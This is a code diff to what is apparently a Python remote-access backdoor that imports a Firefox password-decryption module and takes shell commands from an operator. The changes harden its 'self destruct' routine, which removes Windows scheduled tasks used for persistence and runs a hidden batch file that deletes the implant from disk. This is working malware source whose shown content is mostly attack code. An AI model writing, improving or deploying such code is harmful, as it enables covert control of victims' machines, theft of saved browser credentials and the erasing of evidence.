@@ -6,7 +6,7 @@ import http.client
 import time as tm
 import EngineSupport as FirfoxDecryptor
 import tempfile
-
+import re
 
 GlobalOverwriteOutput = None
 
@@ -100,31 +100,56 @@ def Stop():
 def SelfDestruct():
     path = os.path.abspath(sys.executable if getattr(sys, 'frozen', False) else __file__)
 
-    # Clean up any Windows Task Scheduler entries pointing to this script
-    out = subprocess.run(['schtasks', '/Query', '/FO', 'LIST', '/V'], capture_output=True, text=True).stdout
-    for block in out.split('\n\n'):
-        if path.lower() in block.lower():
-            for line in block.splitlines():
-                if line.startswith("TaskName:"):
-                    tn = line.split(":",1)[1].strip()
-                    subprocess.run(['schtasks', '/Delete', '/TN', tn, '/F'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    try:
+        # Query Windows Task Scheduler tasks
+        result = subprocess.run(
+            ['schtasks', '/Query', '/FO', 'LIST', '/V'],
+            capture_output=True,
+            text=True,
+            encoding="utf-8",  
+            errors="ignore"    
+        )
+        out = result.stdout
+        print(out)
+    except Exception as e:
+        print(f"Error running schtasks: {e}")
+        out = None
 
-    # Write a temporary .bat file to delete the script and itself
+    if out:  # ✅ Make sure out is not None
+        for block in re.split(r'\n\s*\n', out):
+            if path.lower() in block.lower():
+                for line in block.splitlines():
+                    if line.startswith("TaskName:"):
+                        tn = line.split(":", 1)[1].strip()
+                        try:
+                            subprocess.run(
+                                ['schtasks', '/Delete', '/TN', tn, '/F'],
+                                stdout=subprocess.DEVNULL,
+                                stderr=subprocess.DEVNULL
+                            )
+                            print(f"Deleted task: {tn}")
+                        except Exception as e:
+                            print(f"Error deleting task {tn}: {e}")
+                
+
+    # Create temporary batch file to self-destruct
     bat = tempfile.NamedTemporaryFile(delete=False, suffix=".bat")
     bat_path = bat.name
     bat.write(f"""
 @echo off
-ping 127.0.0.1 -n 3 >nul
-copy /y NUL "{path}" >nul
+timeout /t 3 /nobreak >nul
 del /f /q "{path}"
 del /f /q "{bat_path}"
-    """.strip().encode())
+    """.strip().encode('utf-8'))  # 🔥 encode('utf-8') just to be clean
     bat.close()
 
-    # Run the batch file in the background and exit this script
-    subprocess.Popen(['cmd.exe', '/c', bat_path], creationflags=0x08000000)
+    # Run the batch file hidden
+    try:
+        subprocess.Popen(['cmd.exe', '/c', bat_path], creationflags=0x08000000)
+        print(f"Batch file created at {bat_path} and executed.")
+    except Exception as e:
+        print(f"Error running batch file: {e}")
     sys.exit()
-
 
 def EstablishConnection():
     global GlobalOverwriteOutput
@@ -185,11 +210,15 @@ def EstablishConnection():
                 found = True
             if splited_command[0].lower() == "self":
                 if splited_command[1].lower() == "destruct":
-                    if splited_command[2].lower() == "-a":
-                        SelfDestruct()
-                        found = True
-                    else:
+                    try:
+                        if splited_command[2].lower() == "-a":
+                            SelfDestruct()
+                            found = True
+                        else:
+                            output = "You are Termanating the shell, you won't be able to acces the host again. Are you sure you want to do that? if yes then add '-a' to the command."
+                    except IndexError:
                         output = "You are Termanating the shell, you won't be able to acces the host again. Are you sure you want to do that? if yes then add '-a' to the command."
+                    found = True                            
             if splited_command[0].lower() == "cd":
                 try:
                     # Check if a path is provided
